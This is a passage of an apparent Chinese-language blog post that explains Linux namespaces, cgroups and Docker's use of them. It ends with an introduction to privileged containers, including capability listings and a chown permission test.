&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;| Mount namespaces | CLONE_NEWNS | Linux内核2.4.19 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| ---------------------- | -------------- | ------------------------- |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| UTS Namespaces | CLONE_NEWUTS | Linux内核2.6.19 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| IPC NameSpaces | CLONE_NEWIPC | Linux内核2.6.19 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| PID namespaces | CLONE_NEWPID | Linux内核2.6.24 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| Network namespaces | CLONE_NEWNET | Linux内核2.6.24-&amp;gt;2.6.29 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| User namespaces | CLONE_NEWUSER | Linux内核2.6.23 |&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 Linux 文档中我们可以看到，目前，Linux 实现了六种不同类型的命名空间。每个命名空间的目的是将特定的全局系统资源包装在一个抽象中，使命名空间内的进程看起来拥有自己的全局资源隔离实例。命名空间的总体目标之一是支持容器的实现，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzUyNDk1Mi8=&#34;&gt;容器&lt;/span&gt;是一种用于轻量级虚拟化（以及其他目的）的工具，它为一组进程提供了它们是系统上唯一进程的错觉。&lt;/p&gt;
&lt;h3 id=&#34;2linux-cgroup&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2linux-cgroup&#34;&gt;#&lt;/a&gt; 2.Linux Cgroup&lt;/h3&gt;
&lt;p&gt;虽然 NameSpace 解决了环境隔离上的问题，但是并没有解决主机上资源的隔离，虽然可以通过 NameSpace 把单个容器关到一个特定的环境中，但是单个容器对其中的进程使用的 CPU，内存，磁盘等这些计算资源其实都是可以操作的，所以对进程进行资源上的限制或者控制，这就 Linux Cgroup 的作用&lt;/p&gt;
&lt;p&gt;Linux CGroup 全称 Linux Control Group， 是 Linux 内核的一个功能，用来限制，控制与分离一个进程组群的资源（如 CPU、内存、磁盘输入输出等）。&lt;/p&gt;
&lt;p&gt;Linux Cgroup 主要提供以下功能&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、Resource limitation：限制资源的使用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例如：内存使用上限以及文件系统的缓存限制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、Prioritization：优先级控制&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例如：CPU 利用和磁盘的 IO 吞吐&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、Accounting 一些审计和一些统计&lt;/p&gt;
&lt;p&gt;4、Control&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;挂起进程，恢复执行进程&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Cgroup 主要限制的资源&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU&lt;/li&gt;
&lt;li&gt;内存&lt;/li&gt;
&lt;li&gt;网络&lt;/li&gt;
&lt;li&gt;磁盘 I/O&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cgroup 子系统&lt;/p&gt;
&lt;p&gt;cgroups 的全称是 control groups，cgroups 为每种可以控制的资源定义了一个子系统。典型的子系统介绍如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;cpu 子系统，主要限制进程的 cpu 使用率。&lt;/li&gt;
&lt;li&gt;cpuacct 子系统，可以统计 cgroups 中的进程的 cpu 使用报告。&lt;/li&gt;
&lt;li&gt;cpuset 子系统，可以为 cgroups 中的进程分配单独的 cpu 节点或者内存节点。&lt;/li&gt;
&lt;li&gt;memory 子系统，可以限制进程的 memory 使用量。&lt;/li&gt;
&lt;li&gt;blkio 子系统，可以限制进程的块设备 io。&lt;/li&gt;
&lt;li&gt;devices 子系统，可以控制进程能够访问某些设备。&lt;/li&gt;
&lt;li&gt;net_cls 子系统，可以标记 cgroups 中进程的网络数据包，然后可以使用 tc 模块（traffic control）对数据包进行控制。&lt;/li&gt;
&lt;li&gt;freezer 子系统，可以挂起或者恢复 cgroups 中的进程。&lt;/li&gt;
&lt;li&gt;ns 子系统，可以使不同 cgroups 下面的进程使用不同的 namespace。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;Cgroup 在什么时候创建&lt;/p&gt;
&lt;p&gt;Linux 内核通过一个叫做 cgroupfs 的伪文件系统来提供管理 cgroup 的接口，我们可以通过 lscgroup 命令来列出系统中已有的 cgroup，该命令实际上遍历了 /sys/fs/cgroup/ 目录中的文件:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lscgroup | tee cgroup.a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Cgroup 限制资源访问&lt;/p&gt;
&lt;p&gt;如果安装 docker 之后，在每个子系统下都会有一个 docker 的目录&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos docker]# pwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/sys/fs/cgroup/cpu/docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos docker]# ls -al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;total 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 7 root root 0 Nov 27 10:44 .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 6 root root 0 Mar 22  2022 ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 0 Sep  5 00:40 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 0 Sep  4 12:33 4ef7dbc2052fcda8d703d7676bd929e12d9f444d95e42624caa68a83246e37d9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 0 Sep  5 00:40 91fb044dac907328965ae3e4813a1ce0c57ead57a30f00cb1aaabbb29d2598bd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 0 Sep  4 12:21 ac016bd93be4a5955fffc8fd108580930fae2266eec95bab966d0a65197f5e40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cgroup.clone_children&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--w--w--w- 1 root root 0 Apr 17  2022 cgroup.event_control&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cgroup.procs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r--r--r-- 1 root root 0 Apr 17  2022 cpuacct.stat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cpuacct.usage&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r--r--r-- 1 root root 0 Apr 17  2022 cpuacct.usage_percpu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.cfs_period_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.cfs_quota_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.rt_period_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.rt_runtime_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.shares&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r--r--r-- 1 root root 0 Apr 17  2022 cpu.stat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 0 Sep  4 12:32 ea2618b4f0bd98b8d0326c98d9edae2e8ee9ad911b4356901b0eac429f0e7996&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 notify_on_release&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Apr 17  2022 tasks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中的 3b63 等都是 docker 容器，启动这个容器时，Docker 会为这个容器创建一个与容器标识符相同的 CGroup，在当前的主机上 CGroup 就会有以下的层级关系：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/UzJuMarkDownImage1bf68aab2e78dfa6ab6df817e1d83e3c.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;每一个 CGroup 下面都有一个 tasks 文件，其中存储着属于当前控制组的所有进程的 pid，作为负责 cpu 的子系统，cpu.cfs_quota_us 文件中的内容能够对 CPU 的使用作出限制，如果当前文件的内容为 50000，那么当前控制组中的全部进程的 CPU 占用率不能超过 50%。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# pwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/sys/fs/cgroup/cpu/docker/3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# ls -al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;total 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 0 Sep  5 00:40 .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 7 root root 0 Nov 27 10:44 ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cgroup.clone_children&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--w--w--w- 1 root root 0 Sep  5 00:40 cgroup.event_control&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cgroup.procs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r--r--r-- 1 root root 0 Sep  5 00:40 cpuacct.stat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cpuacct.usage&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r--r--r-- 1 root root 0 Sep  5 00:40 cpuacct.usage_percpu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.cfs_period_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.cfs_quota_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.rt_period_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.rt_runtime_us&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.shares&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r--r--r-- 1 root root 0 Sep  5 00:40 cpu.stat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 notify_on_release&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r-- 1 root root 0 Sep  5 00:40 tasks&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# cat cpu.cfs_quota_us &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;cgroup 支持文件种类&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1648779855-579587-image.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Linux 的 NameSpace 和 Cgroup 分别解决了不同资源隔离的问题，前者解决了进程、网络以及文件系统的隔离，后者实现了 CPU、内存等资源的隔离。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;docker 的实现原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其实 docker 就是一个 linux 下的进程，通过 Linux NameSpaces 对不同的容器进行隔离，为了保证宿主机与容器资源上的隔离，与资源占用的比例，所有使用 Cgroup 对进程进行资源上的限制或者控制&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;3特权模式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3特权模式&#34;&gt;#&lt;/a&gt; 3. 特权模式&lt;/h3&gt;
&lt;p&gt;启动特权模式&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker run -it --privileged nginx /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;k8s 中，在 pod 的 yaml 配置中添加如下配置时，也会以特权模式启动容器&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;securityContext:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  privileged: true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;特权模式与非特权模式&lt;/p&gt;
&lt;p&gt;1.linux capabilities&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;普通模式下容器内进程只可以使用有限的一些 linux capabilities:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --rm -it  r.j3ss.co/amicontained bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Status: Downloaded newer image for r.j3ss.co/amicontained:latest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Container Runtime: docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Has Namespaces:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pid: true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	user: false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AppArmor Profile: unconfined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Capabilities:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	BOUNDING -&amp;gt; chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Seccomp: filtering&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Blocked Syscalls (64):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	MSGRCV PTRACE SYSLOG SETPGID SETSID USELIB USTAT SYSFS VHANGUP PIVOT_ROOT _SYSCTL ACCT SETTIMEOFDAY MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE DELETE_MODULE GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG AFS_SYSCALL TUXCALL SECURITY LOOKUP_DCOOKIE CLOCK_SETTIME VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY KEXEC_LOAD ADD_KEY REQUEST_KEY KEYCTL MIGRATE_PAGES UNSHARE MOVE_PAGES PERF_EVENT_OPEN FANOTIFY_INIT NAME_TO_HANDLE_AT OPEN_BY_HANDLE_AT SETNS PROCESS_VM_READV PROCESS_VM_WRITEV KCMP FINIT_MODULE KEXEC_FILE_LOAD BPF USERFAULTFD PREADV2 PWRITEV2 PKEY_MPROTECT PKEY_ALLOC PKEY_FREE&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是，特权模式下的容器内进程可以使用所有的 linux capabilities:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --privileged --rm -it  r.j3ss.co/amicontained bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Container Runtime: docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Has Namespaces:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pid: true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	user: false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AppArmor Profile: unconfined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Capabilities:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	BOUNDING -&amp;gt; chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Seccomp: disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;特权模式下，容器内进程拥有使用所有的 linux capabilities 的能力，但是， 不表示进程就一定有使用某些 linux capabilities 的权限。比如，如果容器是以非 root 用户启动的， 就算它是以特权模式启动的容器，也不表示它就能够做一些无权限做的事情:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --rm -it debian:buster chown 65534 /var/log/lastlog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ docker run -u 65534 --rm -it debian:buster chown 65534 /var/log/lastlog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chown: changing ownership of &amp;#x27;/var/log/lastlog&amp;#x27;: Operation not permitted&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --privileged -u 65534 --rm -it debian:buster chown 65534 /var/log/lastlog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chown: changing ownership of &amp;#x27;/var/log/lastlog&amp;#x27;: Operation not permitted&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
